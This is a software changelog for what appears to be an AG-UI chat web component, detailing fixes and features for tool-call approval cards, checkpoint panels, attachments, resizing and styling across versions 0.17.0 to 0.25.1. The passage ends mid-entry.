# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Fixed

- **A server-side tool round went silent between the tool card and the answer.**
  The pending indicator is hidden when a tool call arrives, so the card can be
  the live thing on screen. Client-side tools put it back before returning their
  result; the server-side path never did — so once a streamed result settled the
  card, the wait while the server called the model again had nothing to own it.
  With a large attachment inlined into the tool result, and re-sent with every
  subsequent request, that is the longest pause in a run.

  The indicator now returns when a streamed result settles a card, and is
  cleared by whatever comes next: reasoning, the first text delta, the round
  ending, or the terminal settle guarantee. This is not the case 0.2.1 removed
  it for — that one runs after the run has ended, where nothing would clear it.
  The terminal guarantee that shipped in the same release is what makes showing
  it here safe.

## [0.25.1] — 2026-08-24

### Fixed

- **Two runs that opened on the same sentence read alike in the checkpoint
  panel.** A row leads with the run's first user message and hides the short id
  once it has one, on the argument that the words are the identity. A real run
  index then answered with five runs all opening on "what is on the board?", and
  those rows were as indistinguishable as five timestamps used to be. A preview
  identifies a run only while it is that run's own, so the id comes back for the
  rows whose preview another row repeats and stays hidden for the rows whose words
  are their own — one panel now shows some rows with an id and some without, each
  carrying the best identity it has. Previews are compared as the row renders
  them: whitespace collapsed, case kept, since two spellings a person can tell
  apart are two labels. No new part and no new fallback — `checkpoint-id` is the
  one the time-only row has always used.

## [0.25.0] — 2026-08-14

### Added

- **Every deferred call is asked about in its own card, and all of them at once.**
  A run can defer more than one call, and the wire takes a different answer for
  each — so the UI has to let a person give one, which means saying which card is
  which. Importing three rows gated three `create_event` calls and produced three
  identical prompts: the text comes from the tool, so all three read "Add this
  event to the board?", and nothing else on the card named the row. They were also
  serial, each appearing only once the previous was answered, appended below the
  three calls they gated — so a person answering the first could not compare them
  or tell that two more were coming. **A batch gate that can only be answered
  uniformly is one you have to answer blind.**

  Each prompt now renders into the tool card of the call it gates, under that
  call's own arguments, and every card opens at once. No new wire field was needed:
  the arguments were already there, and the call site already held the card. A
  card being asked about shows its arguments in every `data-tool-display` mode,
  since a density setting must not hide the answer to "which one is this". New
  part: `tool-card-approval`.

- **A status for "deferred, awaiting a decision".** `TOOL_CALL_STATUS` was
  `pending | done | error | declined`, so a gated call sat at `pending` and read
  **running…** while the stream was over and the server idle. A status enum missing
  a state does not omit that state, it renders it as whichever neighbour is
  closest, and this one claimed the opposite of the truth. Gated cards now read
  `waiting for you` (`data-status="deferred"`, `strings.toolDeferred`), with a
  steady dot instead of a spinner, and go back to `pending` on approval — because
  then the tool really is running. A **frontend** tool such as `ask_user` keeps
  saying "running…" while its card is open: the browser is executing it.

- **The checkpoint rows lead with what the run was about.** A run index that
  answers `GET runs/` with a `preview` — the run's first user message — and the
  panel now shows it, with the time demoted to a chip beside it (new part:
  `checkpoint-time`). A row with no preview keeps the old time-plus-short-id
  layout, so an older server is unaffected.

- **`toggleCheckpoints()` and `closeCheckpoints()`.** The built-in ⭯ control now
  calls the toggle, so pressing it a second time dismisses the panel;
  `openCheckpoints()` keeps its open-only meaning for a host that wants exactly
  that.
- **The checkpoint rows show a short run id.** A time is not an identity: two runs
  of the same minute both read "just now", and choosing between them was choosing
  blind. Eight characters of the id, muted, beside the time — with the whole id on
  its own `title` rather than on the row's label, so hovering a row no longer
  raises a full UUID over it. Now the fallback rather than the rule: a row that
  arrives with a `preview` leads with the words instead (see above).

### Changed

- **`approvalRenderer` is called once per interrupt, concurrently.** It used to be
  awaited one at a time. A host that can only ask one question at a time should
  queue inside its renderer.

### Fixed

- **The README's parts list was missing an entire feature, and now a test reads
  it.** Part names are declared public API there, and an undocumented part is not a
  part: a host cannot style what it cannot know exists, and a name guessed wrong
  fails silently. Absent were all twelve checkpoint-panel parts plus
  `checkpoints-button`, and five strays from other features (`code-copy`,
  `resize-handle`, `run-notice-icon`, `run-notice-text`, `skill-item-token`). The
  list drifted because nothing read it, so the fix is not only the missing names:
  it is now a table, spelled out in full rather than as `tool-card` *plus* `-icon`
  shorthand, and a test collects every part the source sets and fails on one the
  table does not name. The handful assembled at runtime are enumerated in that
  test, and adding another such call site fails it too.

- **The checkpoint panel could not be closed by the control that opened it.**
  The button called `open()`, which returns early when the panel is already open,
  so the first gesture anyone tries did nothing. Escape worked, and answering a row
  worked, and that was all. It now toggles, and a pointer landing anywhere else in
  the widget dismisses it — the thread drawer has a backdrop that swallows such a
  click, and this popover has none.

- **The thread drawer and the checkpoint popover could be open at once.** Opening
  either now closes the other. The pointer case was already covered by the
  click-away above, but a host driving its own chrome through `openThreads()` /
  `openCheckpoints()` raises no pointer event, and the drawer would slide open
  underneath a popover still floating over it.

- **The panel read as a list of clickable rows.** Each row painted itself on hover
  while nothing about the row was pressable: the two buttons that *were* pressable
  sat on that highlight as transparent outlines. The row now carries a resting
  surface and no hover at all, and the actions carry the filled-primary /
  outlined-secondary pair the confirmation and approval cards already use, plus
  `:active` and — new — a visible `:focus-visible` ring, in a panel that traps
  focus and is reached by Tab.

- **A narrow panel crushed the timestamp to nothing.** The row is a flex line whose
  only flexible child is the label, so it absorbs every fixed-width element the row
  gains; at 320px the label kept its text, reported it correctly, and measured 0px.
  This is the tool-call head's defect (0.24.0) one panel along, and it is now
  measured in a real browser at both widths — happy-dom lays out no boxes and
  called the broken row a pass.

- **The ⭯ glyph is now ↺.** The old one has no font behind it in most browsers and
  rendered as an unreadable mark at 14px. A header control nobody can name is one
  nobody presses.

- **The composer painted a paperclip that could not upload anything.** The element
  sets `hidden` on the attach button until a host gives it somewhere to upload —
  an `uploadHandler` or `data-attachments-url` — but the button's own
  `display: inline-flex` beat the UA stylesheet's rule for the hidden property, so
  it stayed visible and clickable, opening a file picker whose file had nowhere to
  go. This is the third instance of one trap: the attachment tray was fixed in
  0.23.0 and carries a comment about it two rules away in the same file. Found in
  the framework gallery, where three of the four host apps were in exactly that
  state and nobody had noticed the clip was inert.

  **The mic does not share it**, and the asymmetry is pinned by a test rather than
  assumed: the clip is created and hidden, while the voice wiring returns before
  constructing anything, leaving an empty slot that measures nothing. A
  hidden-state rule for the mic would match no element, so there is one rule.

## [0.24.0] — 2026-08-13

### Added

- **`ag-ui-run-finished`** — an event fired once per interaction, carrying the
  tools that ran and which side ran each (`{ tools: [{ name, side }] }`, typed
  `RunFinishedDetail` / `ToolRun`). **For hosts that render data the agent can
  change.** A server-side tool writes without the page's knowledge, and nothing
  the element dispatched implied "something may have moved underneath you": a
  page that fetched its data on mount had no reason to refetch, so approving a
  server-side write left it showing stale data with no way to notice. Shared
  state was the only channel back, and it is not one a host can rely on, because
  it needs the *agent* to emit `STATE_SNAPSHOT`. Fires on completion, error and
  cancellation alike, since a partial write is still a write; a capability load
  is not counted, since it moves nothing a host renders.

### Changed

- **A server-side approval can now ask a readable question.** An AG-UI
  interrupt's question defaults to the call spelled out —
  `Approve create_event({"title": "Design sync", …})?` — which is accurate and
  not something to put in front of a person, while the *client-side*
  confirmation card has had `x-confirm` for exactly this. The approval card now
  prefers `x-confirm` from the interrupt's `metadata`, so one key covers both
  gates, and a server that supplies nothing keeps the generated text. Anything
  non-string or blank under that key is ignored rather than rendered, since a
  wire field typed `Record<string, any>` can carry an object into the one place
  a person is being asked to allow a write.

### Fixed

- **Every first visit spent a request to be told `404`.** With
  `data-threads-url` set, the element minted a thread id on mount and
  immediately asked the server for its history — history that cannot exist,
  because the id was three lines old. The response was correct and harmless, and
  it put a red `404` in the console of a page where nothing had gone wrong, on
  every first visit to every host. `ClientConversationStore` gained an optional
  `isUnsent(threadId)`, which the session store answers from a marker it sets when
  it mints and drops on the first save, and the remote store skips the fetch when
  it is `true`. Deliberately narrow: *"I hold no messages for this id"* is not the
  same claim as *"this id is new"*, and only the store that minted it can make the
  second one — so a thread picked from the drawer, or created on another device,
  is still fetched.
- **An approved call's tool card broke its own name into pieces.** The card's
  head is a flex row in which the name is the only flexible child, so every
  fixed badge the row gains is taken out of it. The decision badge ("approved by
  you") appears only on the server-approval path, and in a sidebar-width panel it
  left the name **37px** wide: `word-break: break-word` then split *Create event*
  into "Creat / e / event" across three lines. The head wraps now and the name
  keeps a floor instead of a zero min-width, so a badge drops to its own row
  rather than shredding a word, while a genuinely unbreakable name still breaks
  instead of overflowing the card. Measured in a real browser at 470px: the name
  went 37px to 144px and three lines to one.

### Documentation

- **The four framework recipes, not just React's.** The connect-time
  configuration boundary is reached differently by each host, and only **Vue**
  has a hook that runs before insertion (a directive's `beforeMount`); React,
  Svelte 5 and Angular all create the element by hand. Angular additionally needs
  `:host { display: contents }` or its own host element breaks the page's layout.
- **Page actions**: a page action reports that it *fired*, not that it worked;
  a page that saves asynchronously should say so (a `saving` flag in the page
  map) or a verification read will outrun the save; `drag_and_drop` dispatches
  the **native HTML5 drag sequence**, which a pointer-event drag library
  (dnd-kit, the Angular CDK) never sees; and `scroll_to` centres vertically but
  brings into view horizontally.
- **`placement="embedded"` fills the box the host gives it — so give it one.**
  `min-height: 0` plus `overflow: hidden` on the containing element, or a growing
  transcript pushes the composer off the bottom of the window.
- **The auto-injected page map may go nowhere.** It rides in
  `RunAgentInput.context`, and pydantic-ai's AG-UI adapter does not read that
  field, so on such a backend the injected copy is silently dropped and
  `read_page` is the channel that works.

## [0.23.1] — 2026-08-13

### Fixed

- **A reloaded conversation lost every turn after the first plain answer.**
  Restoring stored history iterated `message.toolCalls` behind an
  `!== undefined` check, and an assistant turn that called no tool can arrive
  carrying `null`: the protocol's Python models declare
  `tool_calls: list[ToolCall] | None`, so a server dumping them without
  `exclude_none` sends exactly that, while `@ag-ui/core` types the field
  optional-and-not-nullable — TypeScript therefore offered no hint that the value
  was reachable. Iterating it threw `TypeError: toolCalls is not iterable`
  *inside* the replay, which aborted at that message and left every later turn
  out of the transcript. Nothing surfaced: no error state, no partial-history
  notice, just a short conversation. Measured against a server-backed store, a
  54-message thread restored as two bubbles and one tool card.

  Two things follow from where the throw happened, and both are now closed.
  Tool calls are **narrowed rather than trusted** — the same stance
  `messageAttachments` already takes for the neighbouring field on the same
  message, and for the same reason. And a **shapeless entry is skipped instead of
  ending the replay**: a stored call with no `id`, no `function.name`, or a
  `null` where an object belongs no longer costs the rest of the conversation.
  A call whose `arguments` are missing or not a string still renders, with empty
  arguments, because its name is the part worth showing.

  Only a **server-backed** history reaches this: the default
  `SessionStorageStore` round-trips client-shaped objects through JSON, where an
  absent field stays absent, so the `null` never appears. Anything reading a
  thread index — `data-threads-url` — did, including every Django admin
  configured with a conversation store. There the cost was worse than a short
  transcript: each navigating tool reloads the page and the run continues only
  because the component rehydrates and completes the pending call, so a thread
  that had answered once abandoned its next multi-step task at the first
  navigation.

## [0.23.0] — 2026-08-12

Attachment chips, which turned out to be the least finished corner of 0.22.

### Fixed

- **A filename on a sent attachment chip was invisible on the stock light
  theme.** `.attachment-chip` set the assistant surface as its background but no
  colour, so on a user bubble it inherited `--ag-ui-user-fg` — white on
  `#f1f1f6`, a contrast ratio of 1.13:1 where WCAG AA wants 4.5:1. Only the size
  stayed legible, because it sets its own muted colour, which is exactly how the
  bug read to a user: an icon, a blank gap, and a size. The chip now takes
  `--ag-ui-text`, the same consumer-overridable token the rest of the body text
  uses, so a page that themes its text themes the chip with it. The dark and
  code themes were never affected, which is why this shipped.

- **The composer's attachment tray never collapsed.** The tray sets `hidden`
  while it holds no chips, but its rule declared `display: flex` with no
  `[hidden]` guard, and an author `display` beats the UA stylesheet's
  `[hidden] { display: none }`. Every embed that wired uploads therefore carried
  8px of dead space above the composer at all times. With the tray genuinely
  collapsing, its padding is also symmetric again (`8px 12px`), so a chip clears
  the composer's top edge instead of sitting flush against it.

- **Filenames truncated far short of the space available.**
  `.attachment-chip-name` capped itself at `14ch`, so
  `LQ27552-7006-EXHIBIT-A.pdf` rendered as `LQ27552-7006 …` inside a chip with
  room to spare. The cap is gone: the chip is already `max-width: 100%` with the
  name ellipsising, so its container bounds it, and a genuinely long name now
  ellipsises at the edge it actually reaches. The chip is `box-sizing:
  border-box` with it, which stops that `100%` from overflowing its container by
  the chip's own padding and border.

### Changed

- **Attachment chip icons are inline SVG.** 0.22 moved the chrome's glyphs to
  inline SVG and stopped at the chips, leaving emoji sitting beside SVG send,
  attach and mic buttons — a different optical weight, varying by platform, and
  taking neither `currentColor` nor a size from CSS. Four marks (image, PDF,
  text, generic) now follow the same contract as the rest, painted from the
  chip's own colour so an errored chip turns red glyph and all. Both the sent
  bubble's chips and the composer tray's change together.

### Removed

- **The client-side attachment manifest in `RunAgentInput.context`.**
  `getContext()` appended a one-line summary of the message's attachments; the
  server now derives that from the refs riding the messages, so the client's
  copy only duplicated it on the turn a file was attached. Attachments still
  reach the agent — through the message, which is where they already were. The
  page-map half of `getContext()` is unchanged.

  **This needs a server that derives the manifest itself.** `django-ag-ui`
  does so from 0.42.0. Against an older server nothing replaces the client's
  copy, so the agent stops being told which attachment ids exist and answers a
  question about an attached file by asking for the file — which is the defect
  the server-side derivation was written to fix. Upgrade the server first, or
  together. A host that read the manifest out of the run context itself is
  likewise affected.

## [0.22.0] — 2026-08-11

Two complaints about how the widget *feels*, and both turned out to be structural
rather than cosmetic.

### Changed

- **The composer is one surface, not four boxes.** The input row was a flat flex
  row — attach, mic, textarea, send — with every sibling stretched to the
  textarea's two-row height. That gave a paperclip the same visual weight as the
  field it sits next to and made Send a full-height filled slab. The border,
  background and focus ring now belong to a wrapping `composer-surface`: the
  field is borderless and **grows with what is typed** (from one row up to
  `--ag-ui-composer-max-height`, then scrolls), and a `composer-tools` row
  underneath carries the paperclip and mic as quiet icon buttons with a circular
  Send closing the right-hand end.

  Send is now icon-only. Its accessible name still comes from the `send` /
  `stop` strings (`aria-label` + `title`), and the run state swaps its glyph
  rather than its text, so nothing moves when a run starts. A host that sized
  `::part(send)` by its padding should switch to `--ag-ui-send-size`.

- **Collapsing goes to a round floating launcher.** `collapsed` used to leave the
  full-width header bar sitting on the page, which is most of a chat widget's
  footprint for none of its use. The panel now scales down into a launcher in the
  corner it already occupies and the launcher grows back out of that point;
  `transform` and `opacity` are all that animate, so the morph is
  compositor-only and cannot reflow the host page. `placement="sidebar"` keeps
  its edge rail (and now genuinely *slides* out through the edge it docks
  against — the transition was declared but never wired to a transform), and
  `embedded` / `page` keep the header bar, being host-laid-out and full-screen
  respectively.

  This changes what an existing floating embed looks like when collapsed. The
  collapsed host keeps its box with `pointer-events: none`, so the page beneath
  stays interactive and the launcher takes the clicks.

- **The chat-history drawer and the checkpoints panel slide.** Both were toggled
  with `hidden` alone, which snaps. They now keep their box and hide with
  `visibility`, which is what lets a surface animate *in and out* — an element
  that was never rendered has no before-change style to animate from, and one
  whose `display` flips to `none` cannot animate at all.

- **The chrome's glyphs are inline SVG** (send, stop, paperclip, mic, launcher)
  rather than emoji, each in a slot with the mark as its fallback:
  `icon-send`, `icon-stop`, `icon-attach`, `icon-voice`, `launcher`.

### Added

- **An unread badge on the launcher.** A collapsed widget is the one state where
  an answer can arrive with nothing on screen to say so, so the launcher now
  counts the answers that finished while it was closed (capped at `9+`) and
  expanding marks them read. It is the only affordance here that is **on by
  default**; `data-unread-badge="false"` turns the badge off, and the count keeps
  running so a host chrome can render its own from the new `ag-ui-unread` event
  (`UNREAD_EVENT` / `UnreadDetail`, plus a `chat.unread` getter). The count is
  also the launcher's accessible name — a coloured dot says nothing to a screen
  reader — via the new `expandUnread` string. Tokens:
  `--ag-ui-badge-{bg,fg,size,font-size}`; part `launcher-badge`.

- **`data-launcher-icon-url`** — an icon for the collapsed launcher when it should
  differ from the header's. Falls back to `data-icon-url`, so one attribute still
  feeds both.

- **Motion tokens** — `--ag-ui-motion`, `--ag-ui-ease`, `--ag-ui-ease-pop`. One
  duration and two curves drive every collapse, expand and slide-over. Under
  `prefers-reduced-motion` the duration collapses to a frame; `--ag-ui-motion: 0s`
  switches the animation off outright.

- **Launcher and composer tokens** — `--ag-ui-launcher-{size,bg,fg,radius,icon-size,inset}`,
  `--ag-ui-composer-{radius,max-height}`, `--ag-ui-send-size`, `--ag-ui-tool-btn-size`,
  `--ag-ui-glyph-{size,stroke}`; parts `composer-surface` and `composer-tools`.

- **Motion tests that run in a real browser.** happy-dom runs no transitions, so
  every assertion about this would pass on a stylesheet where nothing animates.
  The Chromium project now asserts on `getAnimations()` — that the browser
  actually *started* the transitions a collapse, an expand and a drawer open are
  supposed to start.

## [0.21.0] — 2026-08-11

Ten findings from a real embed — a cross-origin, cookie-authenticated React host.
Six of them are one defect: **the component assumed it owned the page.** It had
only ever been embedded in its own playground and in `django-admin-agent`, two
hosts that both arrange the page the way it expects.

### Added

- **`getHeaders`** — a function consulted immediately before **every** request, so
  a rotating credential (a short-lived JWT, a re-issued CSRF token) reaches the
  request that needs it. `headers` was a plain field the element never wrote to,
  read at ten sites; configuring auth through `agentFactory` therefore
  authenticated the run and nothing else, and thread history, attachments and the
  catalogs went out anonymous and 401'd — which reads as a backend fault. The two
  compose, merged per key with `getHeaders` winning, so adding a rotating header
  cannot silently drop a static one.

- **`credentials`** (attribute and property) — `omit` / `same-origin` / `include`,
  applied to every request. There was previously no occurrence of `credentials`
  anywhere in the source, so every request used the browser default and a host
  serving its SPA and API from different subdomains sent no cookies, with **no way
  to express the fix** short of replacing the transport. An unknown value is
  rejected where it was written (the property throws; the attribute logs and stays
  inert) rather than becoming a 401 later.

- **`flash(el, options)`** — ring an element without moving focus.
  `focusWithFlash` calls `el.focus()`, which for a helper named "flash" is
  surprising: it takes focus off the composer, can fire blur validation on
  whatever the user was mid-edit in, and can close a menu. Both now accept an
  explicit `focus` option, and `focusWithFlash` focuses with `preventScroll: true`
  so it no longer fights the scroll it just started.

- **`openThreads()` / `openCheckpoints()` / `reload()`.** The header's controls all
  live inside `::part(header)`, so a host rendering its own title bar and hiding it
  lost thread switching entirely. The built-in buttons call exactly these methods,
  so the two routes cannot drift. `reload()` re-runs the startup fetches once
  credentials that arrive late have landed.

- **`ScrollOptions`**, and `scrollIntoCenterView` now returns a promise that
  resolves when the scroll has settled (`scrollend` where available, a short probe
  when nothing moved, a 600 ms cap otherwise). Every DOM-driver primitive awaits it.

### Changed

- **CSS custom properties now work from an ancestor**, which is what the README
  always described and the one thing that could not work: every `--ag-ui-*` default
  was declared on `:host`, which sets the property *on the element*, and an
  element's own value beats anything inherited. A consumer ran the full token map
  on a wrapper for an entire build and concluded they had the names wrong. The
  defaults now sit behind private aliases, so `:root`, a wrapper, the element and
  an inline style all work and resolve in the usual order. **One vocabulary — the
  public `--ag-ui-*` names are unchanged**, and a built-in `theme` / `density` /
  `placement` preset still loses to an explicit page rule.

- **The flash is an `outline`, not a `box-shadow`**, and holds for **1200 ms** with
  a fade rather than 200 ms. A shadow paints outside the border box, so any
  `overflow: hidden` ancestor sharing the element's box — a card, a table cell —
  clipped it entirely while the tool reported success. And 200 ms is below the
  threshold at which someone who does not know where to look notices anything.
  Neither our tests nor the consumer's could have found the second one:
  headless Chromium hides the scroll race, and no automated check has an opinion
  about whether a human sees a 200 ms ring.

- **The flash colour comes from the target's `--ag-ui-accent`** rather than a
  hardcoded indigo, so a themed page is flashed in its own colour.

- **`prefersReducedMotion()` is now honoured where the README already claimed it
  was.** The flash ignored it entirely while the docs said the preference was
  "honoured throughout"; a consumer investigated reduced motion as the cause of an
  invisible highlight on the strength of that sentence. Under reduced motion the
  ring drops its fade but keeps its full hold — reduced motion asks for no
  animation, not for no feedback. `typeInto` and `highlightThenClick` keep their
  explicit-duration contract, and the docs now say so instead of overclaiming.

- **The tool and skill catalog fetches are deferred by one microtask**, so a React
  `ref` assigned in the same commit as insertion is honoured. The thread-history
  request is deliberately **not** deferred: a deferred replay can land after a
  `sendMessage()` and duplicate the transcript. Configure before you insert, or
  call `reload()`; the new React recipe in the README shows both.

### Fixed

- **The resize grip now sits on the corner that actually moves.** The element
  measures which edges its host's layout holds still and stamps them as
  `data-resize-anchor="<y>-<x>"`, but the rules meant to read it were written as
  `[data-resize-anchor~="left"]` — and `~=` matches whitespace-separated words
  while the stamped value is a single hyphenated token, so they could never
  match. **The cursor rules used `=` and did match**, so the pointer followed
  the measurement while the grip stayed where `placement` had guessed: for any
  host that aligns the panel the other way, the cursor promised a diagonal the
  grip was not on, and the grip sat on the corner that stays put.

  Each anchor rule now sets **both** sides of its axis. One that flipped a
  single way could not undo a placement guess that had flipped the other, which
  put the grip back on the anchored corner for an embedded panel its host
  right-aligns.

- **`placement="page"` gutters its composer to the same reading column as its
  messages.** The rule was unscoped, which tied it on specificity with the base
  `.input-row` rule that sets the `padding` shorthand later in the stylesheet;
  source order decided and the shorthand won. ⇒ *No placement ever got the
  gutter* — least of all the one it was written for, where the messages sat in a
  centred column and the composer spanned the full width.

  A duplicated copy of the whole resize block also sat earlier in the file,
  welded to the preceding rule by a comment left between a selector and its
  subject; it parsed as `:host([placement="page"]) .resize-handle`, scoping the
  grip's base positioning to the one placement that hides it.

## [0.20.1] — 2026-08-11

### Fixed

- **`placement="side"` (and `sidebar`) stopped being full height once the
  panel had been resized.** A dragged size is written as a custom property on
  the host, and an inline custom property **outranks a `:host([placement=…])`
  rule setting the same property** — so a height dragged while floating capped a
  docked sidebar that had asked for `100vh`. Since the size persists per tab,
  one drag broke every later visit.

  **The previous release claimed this was already handled, and the reasoning
  was wrong.** Writing `--ag-ui-height` rather than inline `height` was supposed
  to leave placement with the final say; it does not, because the indirection
  changes nothing about the cascade. The fix is explicit rather than
  cascade-dependent: **a placement owns the axes it fixes**, a persisted size is
  applied only to the axes it leaves free, and switching placement hands the
  owned axes back.

  ⇒ *"I used the more specific-looking mechanism" is not a substitute for
  checking which declaration actually wins.*

## [0.20.0] — 2026-08-11

### Added

- **The panel is resizable.** A drag handle on the corner the layout grows
  toward (or the inner edge when docked), with the size persisted per tab and
  restored before the first paint. Arrow keys resize from the keyboard, since a pointer-only control
  has no equivalent elsewhere in the UI; style it via the `resize-handle` part.

  Which axes are draggable is the placement's call: `full` and `page` get no
  handle at all (a `100vw`/`100vh` layout has nothing to drag), `sidebar` /
  `side` get width only, everything else gets both.

  **It writes the custom properties, not inline `width` / `height`.** The
  placement rules set those same properties, so an inline dimension would
  outrank them — a panel dragged while floating would keep that width after
  switching to fullscreen.

  **Which corner the grip sits on is measured, not assumed.** A resize is
  computed from the edge that stays still, and which edge that is belongs to the
  *host's* layout rather than to `placement` — a floating panel is pinned
  bottom-right, an embedded one goes wherever the page's CSS puts it. Deriving
  it from `placement` was wrong for any host that right-aligns the element, and
  the symptom was bad enough to read as a broken control: the panel shrank when
  dragged outward and travelled by its opposite corner. The element now probes
  its own geometry and reflects the result as `data-resize-anchor`.

### Changed

- **The `/` palette leads with the command.** Each row now reads
  `/fill-article Fill the article` rather than the label alone (part
  `skill-item-token`), and a chip's tooltip names the token it stands for. A
  palette that shows only labels cannot teach its own vocabulary — a user who
  never sees `/fill-article` has no way to learn to type it.

- **A skill blocked on an unfilled `{placeholder}` now hands back the
  template.** The partially-filled prompt goes into the composer with the first
  unresolved placeholder selected, so the next keystroke replaces it. Previously
  the pick was refused with a hint and whatever the user had typed to open the
  palette — a lone `/` — was left in the composer, which said nothing about what
  the skill wanted or how to supply it. The hint now says what to do, too.

- **Picking a skill now sends it.** It used to write the text into the
  composer and wait for a second click unless the skill set
  `sendImmediately: true` — so the default behaviour of a shortcut was to not
  take the shortcut. Set `sendImmediately: false` to keep pre-filling, which is
  worth doing where the user is expected to edit before sending.

- **`Skill.prompt` is now optional, and omitting it is the better default for
  anything internal.** A skill with no prompt is **server-resolved**: picking it
  sends the bare `/name` token and the agent expands it, from the harness
  `Skills` capability or the server's own instructions.

  **The prompt was the leak.** A catalog is either a fetched `GET` or an
  inline `data-skills` attribute sitting in the page source, and a skill is
  often where a project's internal workflow is written down most plainly — so
  the client-side catalog published it to anyone who opened the page. Sending a
  token instead keeps the wording on the server entirely, which is what
  "trigger a `/command` without exposing the prompt" actually requires; hiding
  the text behind a chip label would only have moved it off screen.

  `parseSkills` accepts a catalog entry with no `prompt` rather than dropping
  it — requiring the field would have silently discarded exactly the skills
  whose wording was kept off the browser. Pairs with `django-ag-ui`'s
  `SkillSpec.prompt` becoming optional.

## [0.19.0] — 2026-08-11

### Changed

- **A tool card's arguments and its result are now two labelled regions, not one
  block.** Compact mode emitted `args: {...}` and the result into a single
  `<pre>` separated by a blank line, with nothing marking where the call ended
  and the answer began. Both payloads now have their own heading, their own
  `part` (`tool-card-args` / `tool-card-result`, headings via
  `tool-card-section-label`, body via `tool-card-body`), and are pretty-printed.

  Breaking for anyone styling `tool-card-result` as a single combined block.
  A call with no arguments no longer renders an empty `{}` in a box of its own.

- **`data-tool-display` is now live.** Changing it restyles every card already
  in the transcript, the way `data-answer-well` always has. The modes are pure
  visibility over **one DOM shape**, selected by the shadow CSS from the host
  attribute; previously each card baked its structure at construction from the
  value read at that moment, so a change reached only cards created afterwards
  and the setting appeared not to work until the next conversation.

  `ToolCallCard`'s constructor consequently no longer takes a mode argument.

- **The confirmation card leaves once it is answered.** It stayed in the
  transcript as a spent form with its buttons disabled, which read as an
  outstanding question rather than a settled one. A prompt and a record are
  different objects: the record is the tool card it gates, which settles to the
  outcome and scrolls with the rest of the transcript.

- **The confirmation card was appended to the wrong parent**, and it is the
  reason it drifted to the foot of a turn. Every other inline card — tool,
  approval, `ask_user`, run notices — goes into the turn's answer group; this
  one went into the message list, so it became a sibling *after* the group and
  anything that streamed afterwards rendered above it. It now joins the group
  like its siblings.

### Added

- **A gated call records the decision**, from the client-side confirmation card
  **and** the server-side approval interrupt. The tool card carries
  `approved by you` / `declined by you` (part `tool-card-decision`, attribute
  `data-decision`). Previously only a *refusal* left a trace — an approved call
  simply ran, making a gated call's transcript identical to one that was never
  gated, and the server-side gate left nothing at all even though it is the one
  guarding tools that run on the backend.

  **Session-scoped, like the "run interrupted" notice.** AG-UI carries no
  approval message — the answer rides `resume[]` as transient run input — so a
  reload restores the call and its result but not the note. Durable "who
  approved what" is an audit concern, not a transcript one.

- **Each header control takes its own icon slot** — `icon-history`,
  `icon-checkpoints`, `icon-new`, `icon-collapse` — with the built-in glyph as
  the fallback, so existing embeds are unchanged. The glyph used to be the
  button's own `textContent`: a host could restyle a control through its `part`,
  or swap one character for another with a CSS `content` override, but could
  never supply a brand `<img>` or `<svg>`.

- **`argumentsLabel`, `decisionApproved` and `decisionDeclined`** in `UiStrings`.
  `resultLabel` / `errorLabel` / `declinedLabel` are now the result region's
  heading rather than a toggle label, and `details` labels the toggle in every
  mode.

### Fixed

- **A server that reuses a message id now gets a warning.** `@ag-ui/client`
  appends to a message id already in its history rather than starting a new one,
  so two answers merge into one transcript entry — silently, and the merged
  entry is what gets persisted. The protocol has no rule to enforce and refusing
  the event would be worse than the merge, so this warns and continues.

  Found because the demo harness was doing exactly this, which is the
  argument for the harness in miniature: the bug was the consumer's, the
  invisibility was ours.

- **The demo playground covers the surface it is meant to demonstrate.** The
  scripted agent now dispatches on the latest turn — a server-resolved skill, a
  tool that throws, an `ask_user` question, or the form-filling script — instead
  of replaying one script for everything, and the page gained header-icon,
  German-strings and reset-size controls plus a short "what to try" guide.

  Two harness defects were making the component look broken. Its follow-up
  detection matched **any** tool message in the thread, so once a conversation
  had run a single tool every later turn answered "Done" to everything. And the
  page forced `flex: 1` on the element, which silently outranks the width a
  resize writes — the drag worked and nothing moved.

- **The demo harness reused message ids**, which produced three symptoms that
  all read as component bugs and were none of them. It streamed every follow-up
  answer under a hardcoded id, and `@ag-ui/client` appends to a message id
  already in its history rather than starting a new one — so repeating a prompt
  grew a single entry, that entry replayed out of order after a reload (sitting
  where it was first created, with the later prompts after it), and the
  unfinished-run notice then fired correctly over the corrupted history. Fresh
  ids per message, as a real server issues.

## [0.18.0] — 2026-08-10

### Added

- **A copy button on code blocks in agent answers.** An agent answering with
  code is answering with something the reader means to *use*, and selecting it
  by hand out of a scrolling transcript — inside a shadow root, in a narrow
  sidebar — was the one interaction the chat surface made harder than the page
  around it.

  Revealed on hover **and keyboard focus** (hidden-until-hover is invisible to a
  keyboard user), styleable via the `code-copy` part, with `copyCode` /
  `copied` / `copyFailed` in `UiStrings`.

  **It reports failure rather than always claiming success.** The Clipboard
  API needs a secure context and is simply absent in some embeddings; a button
  that always says "Copied" sends the reader off to paste stale clipboard
  content and find out somewhere else entirely.

### Fixed

- **A bare `data-prompt-chips` or `data-slash-commands` now enables the
  feature**, instead of silently disabling it. Both were compared against the
  string `"true"`, so writing the attribute bare — the spelling every native
  boolean attribute uses, and the one a reader reaches for first — turned off
  the thing it names, with nothing to indicate why the chips never appeared.
  `="false"` still turns them off.

- **The checkpoint panel manages focus.** It declared `role="dialog"` and took
  no focus at all, so a keyboard user was left behind an open dialog; the thread
  drawer had done this correctly all along. Focus now moves in on open, is
  restored on close, and Tab is trapped while it is open.

  **With no continuable runs the panel holds no controls**, so the panel
  itself is focusable as the fallback — otherwise "move focus to the first
  control" silently does nothing in exactly the case where the user has least to
  go on.

- **The README described a `dist/ag-ui-web-component.bundle.css` that the build
  has never emitted.** The styles are a template literal injected into the
  shadow root, so there is no sidecar to load — and a reader looking for the
  file to override was looking for the wrong seam. Documented as CSS custom
  properties and `part` attributes instead.

## [0.17.0] — 2026-08-10

### Added

- **`sendMessage(content, attachments?)`** — send as if the user had typed it:
  user bubble, `ag-ui-submit`, run started. The programmatic half of the
  composer, for an "Ask about this order" button, a command palette, or a
  composer of your own replacing the built-in one. The built-in Send now reads
  the composer, clears it, and calls this, so the two paths cannot drift.

  It no-ops while a run is in flight — a second concurrent run would orphan the
  first — and for an entirely empty message. Unlike the built-in Send it does
  **not** consult the attachment tray: what you pass is what is sent, so a host
  composer stays in charge of its own state.

- **`attachFile(file)`** — queue a file into the tray exactly as the picker and
